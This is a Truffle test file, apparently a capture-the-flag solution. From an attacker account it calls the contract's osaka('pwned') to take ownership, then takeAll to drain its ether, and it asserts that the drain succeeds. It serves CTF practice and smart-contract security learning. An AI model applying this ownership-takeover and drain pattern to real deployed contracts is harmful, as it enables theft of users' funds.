const CaptureTheFlag = artifacts.require("CaptureTheFlag");

contract("BadGuyContract", (accounts) => {
  const oneEther = web3.utils.toWei("1");
  let players = [accounts[1], accounts[2], accounts[3]];
  let attackerAccount = accounts[1];

  let captureTheFlag;
  let targetAddress;

  before("get deployed instance of CTF contract", async () => {
    captureTheFlag = await CaptureTheFlag.deployed();
    targetAddress = captureTheFlag.address;
    await captureTheFlag.registerAllPlayers(players);
  });

  before("fund CTF instance", async () => {
    targetAddress = captureTheFlag.address;
    await web3.eth.sendTransaction({
      from: accounts[0],
      to: targetAddress,
      value: oneEther
    });
  });

  it("should exploit the CTF contract", async () => {
    const initialTargetBalance = await web3.eth.getBalance(targetAddress);
    const initialBadGuyBalance = await web3.eth.getBalance(attackerAccount);

    console.log(`initial target contract balance: ${initialTargetBalance}`);
    console.log(`initial Attacker contract balance: ${initialBadGuyBalance}`);

    assert.strictEqual(initialTargetBalance.toString(10), "1000000000000000000", "Target initial balance incorrect.");
    assert.strictEqual(initialBadGuyBalance.toString(10), "100000000000000000000", "BadGuy balance incorrect.");

    try {
      await captureTheFlag.osaka("pwned", { from: attackerAccount });
      let owner = await captureTheFlag.owner();
      assert.equal(owner, attackerAccount);

      await captureTheFlag.takeAll({ from: attackerAccount });
    } catch (err) {
      console.log(`Error occured: ${err.message}`);
    }

    const finalTargetBalance = await web3.eth.getBalance(targetAddress);
    const finalBadGuyBalance = await web3.eth.getBalance(attackerAccount);

    console.log(`final target contract balance: ${finalTargetBalance}`);
    console.log(`final Attacker contract balance: ${finalBadGuyBalance}`);

    assert.strictEqual(finalTargetBalance.toString(10), "0", "Target final balance incorrect. Maybe this is a honeypot?");
    assert.strictEqual(finalBadGuyBalance.toString(10), "100998987000000000000", "BadGuyContract final balance incorrect. Maybe this is a honeypot?");
  });
});